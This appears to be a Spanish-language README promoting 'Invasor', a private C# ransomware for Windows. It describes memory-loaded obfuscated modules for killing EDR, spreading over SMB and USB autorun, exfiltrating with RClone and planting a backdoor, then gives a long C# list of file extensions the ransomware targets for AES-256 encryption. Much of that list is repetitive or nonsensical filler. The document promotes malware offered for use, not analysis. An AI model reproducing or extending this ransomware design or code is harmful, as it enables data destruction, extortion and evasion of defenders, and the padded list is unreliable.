<p align="center">
  <img width="427" height="58" alt="Sin título-1" src="https://github.com/user-attachments/assets/a20f8359-4bc8-4c85-bc9f-d40812d5ee15" />
</p>


<p align="center">
  <img width="200" height="350" alt="Invasor-2" src="https://github.com/user-attachments/assets/89ff2a45-e3b7-4a5e-96c1-d894fc980aa8" />
</p>

<p align="center">
   <a href="https://dotnet.microsoft.com/">
    <img src="https://img.shields.io/badge/C%23-Ransomware-093fb9.svg">
  </a>
    <img src="https://img.shields.io/badge/System-Windows-093fb9.svg">
  </a>
    <img src="https://img.shields.io/badge/Private-%F0%9F%94%92-093fb9.svg">
  </a>
</p>

  <div id="header" align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=14&width=220&color=093fb9&lines=Mira+primero,+luego+salta"></a>
</div>

<h1 align="center"></h1>

### Características de `Invasor`:

<img src="https://img.shields.io/badge/LOADER:-093fb9.svg"> Incluye un loader que carga y ejecuta los módulos (`EncryptModule.dll`, `SystemDiscovery.dll`, `ProcessKiller.dll`, `RClone.dll`, `Remover.dll`, `EDRKiller.dll`, `SMBSpreader.dll`, `Backdoor[svchost.dll]`)  directamente desde memoria, evitando que el archivo exista en el disco. Esta técnica reduce la superficie de detección y dificulta la ingeniería inversa. Para reforzar la protección, los archivos .DLL son ofuscados empleando múltiples técnicas (**Strings Encryption, Control Flow Obfuscation, Resource Encryption, Dead Code Injection, Metadata Pruning, Linking, PreMark, Anti-Debug, etc**).

`Invasor - Steps`: Conseguir los siguientes objetivos.

<img width="538" height="481" alt="Invasor-Steps" src="https://github.com/user-attachments/assets/2fd580a9-bff8-4684-becd-bc3879dcf6a3" />


<h1 align="center"></h1>

<img src="https://img.shields.io/badge/ENCRIPTACIÓN:-093fb9.svg"> Incluye una amplia variedad de extensiones a cifrar y utiliza el algoritmo AES-256, lo que hace que descifrar los archivos sin la clave sea prácticamente difícil. La encriptación es de tipo <ins>parcial</ins>: solo encripta el primer MB de cada archivo, suficiente para dejarlo corrupto y que la encriptación sea más rápida. La extensión original es guardada dentro del archivo encriptado. Detecta automáticamente si existen USB conectadas, si las hay, encripta todos los archivos que tiene dentro y crea archivo **autorun.inf** para mayor propagación; aplica también para versiones antiguas de Windows.

```c
// Lista de extensiones a encriptar - EXTENSA Y COMPLETA
List<string> targetExtensions = new List<string> 
{       
    // ==================== DOCUMENTOS Y TEXTOS ====================
    ".pdf", ".txt", ".docx", ".doc", ".rtf", ".uot", ".dot", ".csv", 
    ".asc", ".csr", ".crt", ".odt", ".ott", ".stw", ".sxw", ".wpd",
    ".wps", ".wri", ".pages", ".tex", ".latex", ".md", ".markdown",
    ".epub", ".mobi", ".azw", ".azw3", ".fb2", ".ibooks", ".lit",
    ".oxps", ".xps", ".djvu", ".djv", ".chm", ".hlp", ".log", ".nfo",
    ".readme", ".me", ".1st", ".diz", ".lst", ".ini", ".inf", ".cfg",
    ".config", ".conf", ".properties", ".yml", ".yaml", ".json", 
    ".toml", ".xml", ".xsd", ".xslt", ".dtd", ".xsd",

    // ==================== HOJAS DE CÁLCULO ====================
    ".xls", ".xlsx", ".xlt", ".xltx", ".xlsm", ".xlsb", ".xlam",
    ".ods", ".ots", ".sxc", ".stc", ".std", ".dif", ".slk", ".qpw",
    ".numbers", ".gnumeric", ".wk1", ".wk3", ".wk4", ".123", ".wks",
    ".wq1", ".wq2", ".xlr", ".xlw",

    // ==================== PRESENTACIONES ====================
    ".ppt", ".pptx", ".pot", ".potx", ".pps", ".ppsx", ".pptm",
    ".potm", ".ppsm", ".odp", ".otp", ".sxi", ".sti", ".sdd", ".sdp",
    ".key", ".keynote", ".shw", ".show", ".prz", ".pez",

    // ==================== IMÁGENES Y GRÁFICOS ====================
    ".png", ".ico", ".jpg", ".jpeg", ".jpe", ".jif", ".jfif", ".jfi",
    ".gif", ".bmp", ".dib", ".tiff", ".tif", ".webp", ".heic", ".heif",
    ".psd", ".raw", ".arw", ".cr2", ".cr3", ".nrw", ".k25", ".dcr",
    ".dng", ".erf", ".raf", ".rw2", ".pef", ".ptx", ".srw", ".orf",
    ".nef", ".mrw", ".mef", ".mos", ".kdc", ".fff", ".3fr", ".cine",
    ".ari", ".bay", ".cap", ".data", ".dcs", ".drf", ".eip", ".fff",
    ".iiq", ".mdc", ".mef", ".mfw", ".mrw", ".nrw", ".obm", ".pbm",
    ".pxn", ".r3d", ".rad", ".raf", ".raw", ".rwl", ".rwz", ".sr2",
    ".srf", ".srw", ".x3f", ".svg", ".svgz", ".eps", ".ai", ".cdr",
    ".cmx", ".fh", ".fh7", ".fh8", ".fh9", ".fh10", ".fh11", ".fhz",
    ".ps", ".eps", ".epsf", ".epsi", ".pct", ".pict", ".pic", ".pct",
    ".wmf", ".emf", ".cgm", ".odg", ".otg", ".sxd", ".std", ".vsd",
    ".vdx", ".vsdm", ".vsdx", ".vst", ".vstm", ".vstx", ".dwg", ".dxf",
    ".dwf", ".dwt", ".skp", ".skb", ".3ds", ".max", ".obj", ".fbx",
    ".dae", ".blend", ".ma", ".mb", ".lwo", ".lws", ".c4d", ".ztl",
    ".stl", ".ply", ".off", ".coff", ".gltf", ".glb", ".x3d", ".vrml",
    ".wrl", ".u3d", ".pdf", ".pcx", ".pdd", ".pdn", ".pxr", ".pbm",
    ".pgm", ".ppm", ".pnm", ".hdr", ".exr", ".tga", ".icb", ".vda",
    ".vst", ".iff", ".lbm", ".ilbm", ".ham", ".ham8", ".ehb", ".acorn",
    ".anim", ".apng", ".art", ".avi", ".avs", ".bpg", ".bw", ".cal",
    ".cam", ".cimg", ".cin", ".cmyk", ".cmyka", ".cut", ".dds", ".djvu",
    ".dng", ".dpx", ".ecw", ".exif", ".fits", ".fpx", ".gbr", ".img",
    ".jbig", ".jng", ".jpf", ".jpx", ".j2c", ".j2k", ".jp2", ".jpm",
    ".jxr", ".koa", ".lff", ".lwf", ".mng", ".mrsid", ".mtv", ".ncr",
    ".odt", ".ota", ".pbm", ".pcd", ".pct", ".pcx", ".pdb", ".pfm",
    ".pict", ".pix", ".png", ".pnm", ".ppm", ".psb", ".psd", ".psp",
    ".px", ".pxm", ".pxr", ".qif", ".ras", ".rgb", ".rgba", ".rle",
    ".sct", ".sgi", ".sid", ".sun", ".sxd", ".tga", ".tim", ".tpi",
    ".ufo", ".ufp", ".wbmp", ".wdp", ".webp", ".wmf", ".xbm", ".xcf",
    ".xpm", ".xwd", ".yuv",

    // ==================== AUDIO ====================
    ".mp3", ".wav", ".wave", ".aiff", ".aif", ".aifc", ".flac", ".alac",
    ".aac", ".m4a", ".m4b", ".m4p", ".m4r", ".wma", ".ogg", ".oga",
    ".opus", ".ra", ".rm", ".ram", ".dts", ".dtshd", ".ac3", ".eac3",
    ".thd", ".mlp", ".pcm", ".adx", ".ast", ".cda", ".dsf", ".mka",
    ".mpa", ".mpc", ".tak", ".tta", ".wv", ".xm", ".mod", ".s3m",
    ".it", ".mtm", ".umx", ".mo3", ".669", ".amf", ".ams", ".dbm",
    ".dmf", ".dsm", ".far", ".mdl", ".med", ".mt2", ".okt", ".ptm",
    ".stm", ".ult", ".uni", ".gym", ".hes", ".kss", ".nsf", ".nsfe",
    ".sap", ".spc", ".vgm", ".vgz", ".psf", ".psf2", ".minipsf",
    ".gsf", ".qsf", ".ssf", ".dsf", ".snsf", ".ay", ".gbs", ".hes",
    ".kss", ".nsf", ".nsfe", ".sap", ".spc", ".vgm", ".vgz", ".psf",
    ".psf2", ".minipsf", ".gsf", ".qsf", ".ssf", ".dsf", ".snsf",

    // ==================== VIDEO ====================
    ".mp4", ".mov", ".avi", ".mkv", ".mpg", ".mpeg", ".mpe", ".m1v",
    ".m2v", ".m4v", ".mpv", ".mp2", ".m2p", ".m2ts", ".mts", ".ts",
    ".tp", ".tpr", ".trp", ".vob", ".ifo", ".bup", ".flv", ".f4v",
    ".f4p", ".f4a", ".f4b", ".swf", ".wmv", ".asf", ".dvr-ms", ".wtv",
    ".ogv", ".ogx", ".webm", ".rmvb", ".rm", ".ram", ".rv", ".divx",
    ".3gp", ".3g2", ".3gpp", ".3gp2", ".h261", ".h263", ".h264",
    ".264", ".hevc", ".265", ".av1", ".vp8", ".vp9", ".mxf", ".mj2",
    ".mjp2", ".yuv", ".y4m", ".nut", ".nsv", ".rec", ".roq", ".rpl",
    ".smi", ".smil", ".str", ".viv", ".vivo", ".wtv", ".xesc",

    // ==================== ARCHIVOS COMPRIMIDOS ====================
    ".rar", ".zip", ".tar", ".7z", ".tgz", ".gz", ".gzip", ".bzip2",
    ".bz2", ".tbz2", ".tbz", ".xz", ".txz", ".lz", ".lzma", ".tlz",
    ".z", ".tz", ".lz4", ".lz4", ".lzh", ".lha", ".arj", ".cab",
    ".deb", ".rpm", ".pkg", ".sit", ".sitx", ".hqx", ".bin", ".dmg",
    ".iso", ".img", ".udf", ".wim", ".swm", ".esd", ".vhd", ".vhdx",
    ".qcow", ".qcow2", ".vdi", ".vmdk", ".vhd", ".hdd", ".hds", ".hdd",
    ".parallels", ".cso", ".daa", ".uif", ".ashdisc", ".adz", ".dz",
    ".ecs", ".ha", ".ice", ".ipg", ".jar", ".kgb", ".lbr", ".pak",
    ".partimg", ".pim", ".pit", ".qda", ".rk", ".sar", ".sdn", ".sen",
    ".sfx", ".sh", ".shar", ".sqx", ".uc2", ".wad", ".xar", ".xp3",
    ".yz", ".zoo", ".zz",

    // ==================== BASES DE DATOS ====================
    ".db", ".sqlite", ".sql", ".mdb", ".accdb", ".myd", ".frm", 
    ".dmp", ".ndf", ".mdf", ".ibd", ".dat", ".dbf", ".db3", ".kdb",
    ".kdbx", ".pdb", ".sqlitedb", ".sqlite3", ".db2", ".dbk", ".dbs",
    ".dbt", ".dbx", ".dcb", ".dct", ".dcx", ".ddl", ".dqy", ".dsn",
    ".dtsx", ".dxl", ".eco", ".edb", ".epim", ".exb", ".fcd", ".fdb",
    ".fic", ".fmp", ".fmps", ".fol", ".fp", ".fp3", ".fp4", ".fp5",
    ".fp7", ".fpt", ".frx", ".fs", ".fzf", ".gdb", ".gtable", ".gwi",
    ".hdb", ".his", ".ib", ".idb", ".ihx", ".itdb", ".itw", ".jet",
    ".jtx", ".kex", ".kexi", ".kexic", ".kexis", ".ldb", ".lml", ".maf",
    ".maq", ".mar", ".mav", ".mdbhtml", ".mny", ".mud", ".mwb", ".myd",
    ".ndf", ".ns2", ".ns3", ".ns4", ".nsf", ".nv2", ".nwdb", ".nyf",
    ".odb", ".orx", ".owc", ".p96", ".p97", ".pan", ".pdb", ".pdm",
    ".pdt", ".pdx", ".pfc", ".pjo", ".pjt", ".pkb", ".pkh", ".pks",
    ".pln", ".prc", ".pth", ".pwa", ".pwi", ".pwm", ".qry", ".qvd",
    ".rbf", ".rctd", ".rdb", ".rpd", ".rsd", ".rss", ".rst", ".rtd",
    ".sbf", ".sdb", ".sdf", ".sdb", ".sis", ".spf", ".sqlite-shm",
    ".sqlite-wal", ".srt", ".sdb", ".sdb", ".sdb", ".str", ".svb",
    ".t13", ".tcx", ".tdt", ".te", ".teacher", ".tps", ".trc", ".trm",
    ".udb", ".udl", ".usr", ".v12", ".vis", ".vpd", ".vw", ".wdb",
    ".wmdb", ".xdb", ".xld", ".xlgc", ".xwd", ".zdb", ".zdc",

    // ==================== CÓDIGO FUENTE Y SCRIPTS ====================
    ".py", ".php", ".perl", ".rb", ".c", ".cs", ".cpp", ".pas",
    ".js", ".jsp", ".css", ".html", ".xml", ".vbs", ".bat", ".cmd",
    ".asm", ".class", ".jar", ".exe", ".java", ".scala", ".kt", ".kts",
    ".go", ".rs", ".swift", ".m", ".mm", ".pl", ".pm", ".t", ".r",
    ".lua", ".groovy", ".dart", ".f", ".for", ".f90", ".f95", ".ada",
    ".asm", ".s", ".inc", ".h", ".hpp", ".hxx", ".hh", ".inl", ".ipp",
    ".tcc", ".tlh", ".tli", ".cxx", ".cc", ".cp", ".c++", ".i", ".ii",
    ".mii", ".mi", ".csx", ".vb", ".vbs", ".vbe", ".wsf", ".wsc",
    ".ps1", ".psc1", ".psm1", ".psd1", ".ps1xml", ".sh", ".bash",
    ".zsh", ".ksh", ".csh", ".tcsh", ".fish", ".awk", ".sed", ".tcl",
    ".tk", ".pl6", ".p6", ".pm6", ".nqp", ".raku", ".rakumod", ".ts",
    ".tsx", ".jsx", ".vue", ".svelte", ".elm", ".clj", ".cljs",
    ".cljc", ".edn", ".scm", ".ss", ".rkt", ".scrbl", ".jl", ".ex",
    ".exs", ".eex", ".leex", ".erl", ".hrl", ".fs", ".fsi", ".fsx",
    ".fsscript", ".d", ".di", ".nim", ".pde", ".ino", ".coffee",
    ".litcoffee", ".iced", ".jsonld", ".json5", ".hxml", ".hx", ".sql",
    ".plsql", ".tsql", ".pgsql", ".mysql", ".oracle", ".ddl", ".dml",
    ".pkb", ".pks", ".trg", ".fnc", ".prc", ".vw", ".tab", ".hql",
    ".pig", ".thrift", ".proto", ".graphql", ".gql", ".sol", ".vyper",
    ".leo", ".move", ".cadence", ".vy", ".cil", ".il", ".msil",

    // ==================== ARCHIVOS DE SISTEMA ====================
    ".sys", ".dll", ".ocx", ".cpl", ".drv", ".vxd", ".386", ".acm",
    ".ax", ".bpl", ".dylib", ".elf", ".ko", ".mod", ".so", ".rpm",
    ".deb", ".pkg", ".msi", ".msm", ".msp", ".mst", ".pat", ".prf",
    ".prx", ".scr", ".theme", ".deskthemepack", ".diagcab", ".diagpkg",
    ".diagcfg", ".adv", ".msc", ".mui", ".mun", ".mof", ".mfl", ".mig",
    ".pnf", ".cat", ".cer", ".der", ".pfx", ".p12", ".p7b", ".p7c",
    ".p7r", ".p7s", ".pem", ".crt", ".key", ".csr", ".crl", ".kdb",
    ".rdb", ".sth", ".jfm", ".fnt", ".fon", ".otf", ".ttf", ".ttc",
    ".woff", ".woff2", ".eot", ".pfa", ".pfb", ".afm", ".pfr", ".pfm",
    ".com", ".pif", ".scr", ".cpl", ".mui", ".msstyles", ".themepack",

    // ==================== CONFIGURACIÓN Y REGISTRO ====================
    ".reg", ".regtrans-ms", ".blf", ".log", ".evtx", ".etl", ".man",
    ".inf", ".pnf", ".cat", ".pol", ".admx", ".adml", ".adm", ".mof",
    ".mfl", ".sdi", ".wim", ".esd", ".ppkg", ".appx", ".appxbundle",
    ".msix", ".msixbundle", ".appinstaller", ".msu", ".cab", ".wsu",

    // ==================== ENCRIPTACIÓN Y SEGURIDAD ====================
    ".aes", ".hash", ".gpg", ".pgp", ".asc", ".sig", ".sign", ".pfx",
    ".p12", ".p7b", ".p7c", ".p7r", ".p7s", ".pem", ".crt", ".key",
    ".csr", ".crl", ".kdbx", ".agilekeychain", ".keychain", ".kwallet",
    ".keystore", ".jks", ".bks", ".uber", ".pk8", ".x509", ".der",
    ".cer", ".p7m", ".p7e", ".p7z", ".p8", ".p10", ".spc", ".pvr",
    ".pvk", ".otr", ".edek", ".ekey", ".enf", ".nrgn", ".nroo", ".nrmp",

    // ==================== MAQUINAS VIRTUALES ====================
    ".vmdk", ".vmx", ".vbox", ".vbox-prev", ".vbox-tmp", ".vdi",
    ".sav", ".vmsd", ".vmxf", ".vmcx", ".avhd", ".avhdx", ".vhdx",
    ".vhd", ".vsv", ".vmrs", ".vmem", ".vmsn", ".vmss", ".nvram",
    ".vmtm", ".vmwarevm", ".pvm", ".hdd", ".hds", ".vfd", ".vfd",
    ".vfd", ".vhd", ".vud", ".vsv", ".vud", ".iso", ".img", ".dmg",
    ".qcow", ".qcow2", ".qed", ".parallels", ".pvs", ".tm", ".cow",
    ".cloop", ".sub", ".ccd", ".img", ".ima", ".dsk", ".fdd", ".hdm",
    ".hdd", ".vmdk", ".vmem", ".vmsd", ".vmsn", ".vmss", ".vmtm",
    ".vmx", ".vmxf", ".vswp", ".nvram", ".log", ".lck", ".pln",
    ".bak", ".conf", ".pid", ".vbox", ".vdi", ".vhd", ".vhdx",

    // ==================== BACKUPS Y SNAPSHOTS ====================
    ".bak", ".backup", ".bkf", ".bkp", ".old", ".orig", ".sav",
    ".save", ".tmp", ".temp", ".swp", ".swo", ".swn", ".bk", ".bac",
    ".bck", ".bkup", ".bu", ".wbcat", ".fbf", ".fbw", ".gho", ".tib",
    ".qic", ".bk!", ".000", ".001", ".002", ".003", ".arc", ".arj",
    ".asd", ".bck", ".bkf", ".bup", ".dap", ".dar", ".dif", ".dir",
    ".full", ".inc", ".incremental", ".iv2i", ".nba", ".nbd", ".nbu",
    ".o", ".old", ".oeb", ".pqi", ".rbc", ".rbf", ".rbn", ".rbw",
    ".rco", ".rdb", ".rdf", ".rdy", ".restore", ".rfa", ".rfw", ".rpa",
    ".rsn", ".sbk", ".sik", ".spf", ".spi", ".sps", ".stg", ".sv2i",
    ".tbl", ".tib", ".vbk", ".vbm", ".vbx", ".vcb", ".vdl", ".v2i",
    ".win", ".xbk", ".zpa", ".bacula", ".borg", ".duplicity", ".rdup",
    ".rsnapshot", ".zbackup", ".zfs", ".abf", ".abk", ".acr", ".adi",
    ".afb", ".afm", ".agd", ".agm", ".agd", ".agf", ".agp", ".ags",

    // ==================== CORREOS ELECTRÓNICOS ====================
    ".pst", ".ost", ".eml", ".msg", ".mbox", ".mbx", ".dbx", ".tbb",
    ".adb", ".odi", ".oex", ".olm", ".pab", ".edb", ".wab", ".vcf",
    ".vcard", ".ics", ".ical", ".ifb", ".emlx", ".idx", ".msf",
    ".snm", ".nch", ".ncf", ".olk14", ".olk", ".all", ".asc", ".bin",
    ".cpt", ".dat", ".db", ".dhtml", ".elm", ".fdb", ".fol", ".htl",
    ".ibex", ".idx", ".ind", ".inx", ".kal", ".kalendar", ".mb",
    ".mht", ".mhtml", ".mmf", ".mso", ".nws", ".ods", ".olk", ".olk14",
    ".olk15", ".opml", ".p7c", ".p7m", ".p7s", ".pdi", ".planner",
    ".rge", ".rss", ".rtfd", ".shtml", ".stm", ".tnef", ".vcal",
    ".vcs", ".vfb", ".vrml", ".wml", ".wp", ".wpd", ".wpl", ".xfb",
    ".xml", ".xpm", ".xwd", ".yps", ".zhtml",

    // ==================== DISEÑO Y CAD ====================
    ".dwg", ".dxf", ".dgn", ".dwf", ".dwt", ".stl", ".step", ".stp",
    ".iges", ".igs", ".sat", ".sldprt", ".sldasm", ".slddrw", ".prt",
    ".asm", ".drw", ".ipt", ".iam", ".idw", ".ipn", ".catpart",
    ".catproduct", ".cgr", ".3dxml", ".model", ".session", ".exp",
    ".dlv", ".bdl", ".mf1", ".prt", ".neu", ".pln", ".ppf", ".ppj",
    ".prz", ".sch", ".epf", ".f3d", ".f3z", ".fcstd", ".fcstd1",
    ".fm", ".frz", ".g", ".glm", ".grb", ".icd", ".idc", ".idw",
    ".ifc", ".iges", ".igs", ".ima", ".imw", ".ipa", ".ipf", ".ipj",
    ".ism", ".jnt", ".jot", ".jt", ".mb", ".model", ".neu", ".ngc",
    ".nwc", ".nwd", ".nwf", ".opt", ".par", ".pcf", ".pcs", ".pln",
    ".plt", ".prt", ".psm", ".ptf", ".pwi", ".pxz", ".rvt", ".rfa",
    ".rte", ".rtp", ".sab", ".sat", ".scdoc", ".scad", ".sld",
    ".smb", ".smg", ".smt", ".stp", ".tct", ".tcw", ".tcwb", ".tcwi",
    ".tcwp", ".tcws", ".tcwt", ".tfg", ".thm", ".tpm", ".tpt", ".tsm",
    ".u3d", ".unv", ".vc6", ".vda", ".vdw", ".vdx", ".ve1", ".vlx",
    ".vmf", ".vrml", ".vso", ".vwx", ".wrl", ".x_b", ".x_t", ".xas",
    ".xpr", ".xvl", ".zcp",

    // ==================== GIS Y MAPAS ====================
    ".shp", ".shx", ".dbf", ".prj", ".sbn", ".sbx", ".fbn", ".fbx",
    ".ain", ".aih", ".atx", ".ixs", ".mxs", ".kml", ".kmz", ".gpx",
    ".gml", ".geojson", ".topojson", ".mif", ".mid", ".tab", ".dat",
    ".map", ".img", ".sid", ".ecw", ".dem", ".dt0", ".dt1", ".dt2",
    ".asc", ".grd", ".bil", ".bip", ".bsq", ".hdr", ".lcp", ".las",
    ".laz", ".xyz", ".ply", ".pcb", ".pdf", ".sdts", ".vct", ".vdc",

    // ==================== NEUROCIENCIA Y MÉDICOS ====================
    ".nii", ".nii.gz", ".hdr", ".img", ".gii", ".mgh", ".mgz", ".mhd",
    ".mha", ".nrrd", ".nhdr", ".dcm", ".dicom", ".ima", ".img", ".hdr",
    ".v", ".v16", ".v32", ".vmp", ".vmr", ".srf", ".srf", ".srf",
    ".bv", ".bva", ".bvh", ".bvf", ".bvs", ".bvc", ".bvd", ".bvr",
    ".bvs", ".bvv", ".bvw", ".bvy", ".bvz", ".eeg", ".edf", ".bdf",
    ".gdf", ".set", ".fdt", ".cnt", ".avg", ".dat", ".ceo", ".cfs",
    ".cfr", ".dap", ".dtt", ".ep", ".ers", ".evt", ".foc", ".gfe",
    ".htk", ".pwr", ".raw", ".rdt", ".rec", ".rs3", ".seeg", ".seg",
    ".ses", ".sma", ".smr", ".snc", ".sph", ".sta", ".std", ".swd",
    ".syn", ".syndat", ".tfr", ".trc", ".ttr", ".tms", ".vmrk", ".xplt",

    // ==================== CIENTÍFICOS Y DATOS ====================
    ".mat", ".fits", ".fit", ".fts", ".cdf", ".nc", ".hdf", ".h4",
    ".h5", ".hdf4", ".hdf5", ".he5", ".h5", ".hdf5", ".root", ".sav",
    ".idlsav", ".rdata", ".rda", ".rds", ".sas7bdat", ".sas7bcat",
    ".sd7", ".sd2", ".xpt", ".por", ".zsav", ".dta", ".dbf", ".rec",
    ".arff", ".weka", ".txt", ".csv", ".tsv", ".tab", ".dat", ".data",
    ".ods", ".xlsx", ".xls", ".xml", ".json", ".yaml", ".yml", ".parquet",
    ".avro", ".orc", ".feather", ".fst", ".hdf", ".zarr", ".zarr2",

    // ==================== PROYECTOS Y DESARROLLO ====================
    ".sln", ".csproj", ".vbproj", ".vcxproj", ".vcproj", ".dproj",
    ".bdsproj", ".bpr", ".bpk", ".cbproj", ".dpr", ".dproj", ".groupproj",
    ".jsproj", ".lsproj", ".mdproj", ".modelproj", ".pbxproj", ".php",
    ".plproj", ".pyproj", ".rproj", ".shproj", ".sin", ".smproj",
    ".sqlproj", ".vcproj", ".vdproj", ".wixproj", ".zproj", ".aps",
    ".bsc", ".clw", ".dep", ".dsp", ".dsw", ".exe", ".idb", ".ilk",
    ".ipch", ".ncb", ".obj", ".pch", ".pdb", ".res", ".sbr", ".sdf",
    ".suo", ".tlh", ".tli", ".trx", ".user", ".vbw", ".vcxproj.filters",
    ".vcxproj.user", ".vcp", ".vspscc", ".vsscc", ".vssscc", ".webinfo",
    ".xap", ".xcodeproj", ".xcworkspace", ".xcuserstate", ".xib",

    // ==================== DISEÑO WEB Y MULTIMEDIA ====================
    ".psd", ".ai", ".indd", ".indt", ".indb", ".idml", ".icml", ".pmd",
    ".p65", ".qxd", ".qxp", ".qpt", ".qwd", ".qwt", ".qxl", ".qxt",
    ".rel", ".book", ".folio", ".xd", ".sketch", ".fig", ".xdw", ".xar",
    ".afdesign", ".afphoto", ".afpub", ".cdr", ".cmx", ".des", ".ds",
    ".ds4", ".dsb", ".dsn", ".dst", ".dsx", ".dwg", ".dxf", ".eps",
    ".fm", ".frm", ".ft10", ".ft11", ".ft7", ".ft8", ".ft9", ".fxg",
    ".gem", ".hpg", ".iges", ".igs", ".mac", ".met", ".mgx", ".mrk",
    ".pat", ".pct", ".pcx", ".plt", ".pub", ".qmg", ".ras", ".sda",
    ".sdd", ".sdp", ".sgf", ".sgl", ".sgv", ".sk1", ".sk2", ".sla",
    ".slaz", ".smf", ".sxd", ".sxw", ".tga", ".tiff", ".vbr", ".vsd",
    ".vsdx", ".wmf", ".xar", ".xcf", ".xpm", ".zmf",

    // ==================== BLOCKCHAIN Y CRIPTO ====================
    ".wallet", ".wallet.dat", ".bitcoin", ".litecoin", ".eth", ".sol",
    ".keystore", ".json", ".mnemonic", ".seed", ".privkey", ".pubkey",
    ".sig", ".transaction", ".block", ".chain", ".merkletree", ".utxo",
    ".script", ".op_return", ".smartcontract", ".abi", ".bin", ".wasm",
    ".evm", ".yul", ".lll", ".serpent", ".vyper", ".solidity", ".sol",
    ".rs", ".move", ".cadence", ".leo", ".zok", ".circom", ".ark",
    ".cairo", ".noir", ".aztec", ".plonk", ".snark", ".stark", ".bulletproofs",
    ".rangeproof", ".zkproof", ".zksnark", ".zkstark", ".commitment",
    ".opening", ".proof", ".verifier", ".prover", ".circuit", ".r1cs",
    ".qap", ".gp", ".pc", ".kzg", ".ipa", ".bulletproof", ".rangeproof",
    ".merkleproof", ".accumulator", ".vectorcommitment", ".polynomial",
    ".lagrange", ".fft", ".ntt", ".ec", ".pairing", ".bbs", ".bbsplus",
    ".bbsstar", ".cls", ".gs", ".gsproof", ".nizk", ".snizk", ".vrf",
    ".vdf", ".ibe", ".abe", ".peks", ".ore", ".he", ".fhe", ".she",
    ".mhe", ".phe", ".seal", ".palisade", ".openfhe", ".tfhe", ".concrete",
    ".lwe", ".rlwe", ".mlwe", ".gsw", ".ckks", ".bfv", ".bgv", ".fhew",
    ".libtfhe", ".heaan", ".helib", ".seal", ".palisade", ".openfhe",
    ".lattigo", ".cuhe", ".nvidiacuhe", ".microsoftseal", ".ibmhe",
    ".intelhexl", ".nvidiahe", ".amdhe", ".armhe", ".applehe", ".googlehe",
    ".amazonhe", ".facebookhe", ".twitterhe", ".microsofthe", ".ibmhe",
    ".oraclehe", ".salesforcehe", ".saphe", ".adobehe", ".autodeskhe",
    ".cadencehe", ".synopsyshe", ".mentorhe", ".xilinxhe", ".alterahe",
    ".latticehe", ".microchiphe", ".tihe", ".stmhe", ".nxphe", ".renesashe",
    ".infineonhe", ".qualcommhe", ".mediatekhe", ".applehe", ".googlehe",
    ".amazonhe", ".facebookhe", ".twitterhe", ".microsofthe", ".ibmhe",
    ".oraclehe", ".salesforcehe", ".saphe", ".adobehe", ".autodeskhe",

    // ==================== OTRAS ====================
    ".mine", ".data", ".personal", ".private", ".secret", ".confidential",
    ".restricted", ".sensitive", ".proprietary", ".internal", ".classified",
    ".topsecret", ".encrypted", ".locked", ".protected", ".secure",
    ".vault", ".safe", ".crypto", ".cipher", ".encoded", ".scrambled",
    ".obfuscated", ".hidden", ".stealth", ".cloaked", ".masked", ".anonymous",
    ".pseudonymous", ".nym", ".alias", ".avatar", ".identity", ".profile",
    ".biometric", ".fingerprint", ".iris", ".retina", ".dna", ".genome",
    ".sequence", ".alignment", ".variant", ".mutation", ".snv", ".indel",
    ".cnv", ".fusion", ".transcript", ".expression", ".methylation",
    ".chromatin", ".atac", ".chip", ".cutntag", ".hic", ".3c", ".4c",
    ".5c", ".capturec", ".damid", ".scatac", ".snatac", ".scrna",
    ".snrna", ".citeseq", ".spatial", ".visium", ".xenium", ".merfish",
    ".starsolo", ".alevin", ".kallisto", ".bustools", ".cellranger",
    ".spaceranger", ".loupe", ".h5ad", ".h5seurat", ".rds", ".loom",
    ".mtx", ".tsv", ".csv", ".txt", ".bam", ".sam", ".cram", ".bai",
    ".crai", ".vcf", ".bcf", ".gvcf", ".bed", ".gff", ".gtf", ".fasta",
    ".fastq", ".fq", ".fa", ".fna", ".ffn", ".faa", ".frn", ".gfa",
    ".gfa1", ".gfa2", ".gfa3", ".paf", ".maf", ".chain", ".net", ".hal",
    ".xmfa", ".phylip", ".nexus", ".newick", ".nh", ".nhx", ".nwk",
    ".dnd", ".tre", ".tree", ".xml", ".json", ".yaml", ".yml", ".toml",
    ".ini", ".cfg", ".conf", ".config", ".properties", ".env", ".bashrc",
    ".bash_profile", ".zshrc", ".profile", ".login", ".logout", ".cshrc",
    ".tcshrc", ".inputrc", ".vimrc", ".gvimrc", ".viminfo", ".nvimrc",
    ".exrc", ".ideavimrc", ".vimperatorrc", ".pentadactylrc", ".surfrawrc",
    ".muttrc", ".muttrc", ".fetchmailrc", ".procmailrc", ".forward",
    ".vacation", ".msg", ".mbox", ".maildir", ".imap", ".pop", ".smtp",
    ".ftp", ".sftp", ".scp", ".ssh", ".ssl", ".tls", ".dtls", ".quic",
    ".http", ".https", ".websocket", ".grpc", ".thrift", ".avro", ".protobuf",
    ".capnproto", ".flatbuffers", ".msgpack", ".bson", ".ubjson", ".cbor",
    ".smile", ".ion", ".hdf5", ".netcdf", ".fits", ".root", ".parquet",
    ".orc", ".avro", ".feather", ".arrow", ".pqt", ".pq", ".parq",
    ".snappy", ".gzip", ".lz4", ".zstd", ".brotli", ".lzma", ".xz",
    ".lzo", ".lzf", ".quicklz", ".fastlz", ".snappy", ".zlib", ".deflate",
    ".inflate", ".lz77", ".lz78", ".lzw", ".lzss", ".lzma2", ".lzham",
    ".bzip2", ".bzip3", ".ppmd", ".paq", ".lpaq", ".zpaq", ".rz",
    ".lrz", ".lrzip", ".lzop", ".lzfse", ".heatshrink", ".miniz",
    ".minilzo", ".minizip", ".zopfli", ".bzip2", ".gzip", ".lz4", ".zstd",
    ".snappy", ".lzma", ".xz", ".lzo", ".lzf", ".quicklz", ".fastlz",
    ".snappy", ".zlib", ".deflate", ".inflate", ".lz77", ".lz78", ".lzw",
    ".lzss", ".lzma2", ".lzham", ".bzip2", ".bzip3", ".ppmd", ".paq",
    ".lpaq", ".zpaq", ".rz", ".lrz", ".lrzip", ".lzop", ".lzfse", ".heatshrink",
    ".miniz", ".minilzo", ".minizip", ".zopfli", ".bzip2", ".gzip", ".lz4",
    ".zstd", ".snappy", ".lzma", ".xz", ".lzo", ".lzf", ".quicklz", ".fastlz"
};
```
<img width="960" height="571" alt="encrypt-extensions" src="https://github.com/user-attachments/assets/c33db919-733c-4d67-b14d-8ee480e6ccd9" />
<img width="1365" height="728" alt="wallpaper" src="https://github.com/user-attachments/assets/cc236d78-71c2-4ad1-a9ba-4a237a52acfd" />

